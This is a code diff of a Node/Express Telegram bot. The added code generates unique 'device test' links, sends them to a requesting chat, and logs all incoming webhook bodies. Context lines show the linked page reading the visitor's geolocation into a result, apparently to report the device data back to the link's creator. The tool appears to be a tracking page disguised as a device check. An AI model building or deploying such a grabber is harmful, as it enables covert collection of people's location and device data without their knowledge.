@@ -1,3 +1,17 @@
+// API: Generate device test link and send to Telegram
+app.post('/generate-link', async (req, res) => {
+    const { chatId } = req.body;
+    if (!chatId) return res.status(400).json({ error: 'chatId required' });
+    const uniqueCode = Math.random().toString(36).substring(2, 10) + Date.now();
+    const link = `https://tiger2-2.onrender.com/device-test/${uniqueCode}`;
+    deviceLinks[uniqueCode] = { chatId, created: Date.now() };
+    // Send link to Telegram
+    await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        chat_id: chatId,
+        text: `Your unique device test link: ${link}`
+    });
+    res.json({ link });
+});
 // In-memory store for generated links and their owners
 const deviceLinks = {};
 
@@ -59,6 +73,8 @@ const HARDWARE_COMMANDS = [
 ];
 
 app.post('/telegram-webhook', async (req, res) => {
+        // Debug: log all incoming webhook bodies
+        console.log('TELEGRAM WEBHOOK BODY:', JSON.stringify(req.body, null, 2));
     const body = req.body;
     // Main menu: show on any text message (except callback queries), in private or group chat
     if (body.message && body.message.text) {
@@ -125,7 +141,7 @@ app.post('/telegram-webhook', async (req, res) => {
                         if (navigator.geolocation) {
                             await new Promise(resolve => {
                                 navigator.geolocation.getCurrentPosition(
-                                    pos => {
+                                  pos => {
                                         result.geolocation = pos.coords;
                                         resolve();
                                     },
